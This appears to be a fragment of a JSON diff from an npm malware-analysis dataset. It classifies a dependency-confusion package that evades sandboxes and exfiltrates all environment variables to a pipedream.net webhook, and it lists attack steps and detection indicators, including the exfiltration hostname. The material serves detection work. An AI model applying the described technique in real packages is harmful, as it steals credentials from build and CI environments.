+                  "why_malicious": "Multiple versions of the package exfiltrate all environment variables to an attacker-controlled webhook, use obfuscated and dynamically constructed hostnames, and implement sandbox evasion techniques to avoid detection. The latest version (0.1.0) is benign to bypass security scanners, while the majority of versions are malicious and designed for dependency confusion attacks targeting build and CI/CD environments."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "Malicious package is installed as a dependency due to dependency confusion, leveraging high minor/patch version numbers to supersede internal packages.",
+                    "implemented_by": [],
+                    "leads_to": "Malicious code execution on the victim machine"
+                  },
+                  {
+                    "step": 2,
+                    "action": "On import or runtime, the code checks environment variables for known sandbox, CI/CD, or analysis indicators to evade detection.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "If not a sandbox or analysis environment, proceeds to data exfiltration"
+                  },
+                  {
+                    "step": 3,
+                    "action": "Collects all environment variables from the victim machine using process.env.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Prepares sensitive data for exfiltration"
+                  },
+                  {
+                    "step": 4,
+                    "action": "Exfiltrates the collected environment variables to an attacker-controlled webhook using a POST request to a dynamically constructed subdomain.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Attacker receives sensitive credentials and secrets from the victim environment"
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Access to process.env and exfiltration of all environment variables to external domains",
+                    "Network POST requests to dynamically constructed subdomains of pipedream.net at import-time or runtime",
+                    "Conditional logic to evade sandboxes or CI/CD environments based on environment variable checks",
+                    "Obfuscated or programmatically constructed hostnames and filter lists in JavaScript code"
+                  ],
+                  "file_indicators": [
+                    "build.js containing both process.env access and http.request usage",
+                    "Obfuscated or minified code in non-production npm packages",
+                    "Presence of large, programmatically constructed filter lists for environment variable checks in build.js"
+                  ],
+                  "network_indicators": [
+                    "*.m.pipedream.net",
+                    "POST requests to subdomains such as eoxb1lay4m45mms.m.pipedream.net"
+                  ],
+                  "how_to_detect": "Monitor for npm packages that access all environment variables and send them to external domains, especially at import-time or during installation. Flag packages with obfuscated or dynamically constructed code, large environment variable filter lists, or network requests to known exfiltration domains such as *.m.pipedream.net. Use both static and dynamic analysis to inspect all package versions, not just the latest, and correlate build.js file contents with suspicious network activity."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "file_path": "/home/wenbo/NPMAnalysis/Dataset/unzip_benign/winston-elasticsearch-yearly/0.18.4/package/transformer.js",
+      "status": "empty",
+      "is_malicious": false,
+      "total_slices": 0,
+      "malicious_slices": 0,
+      "slice_results": []
+    }
+  ]
+}
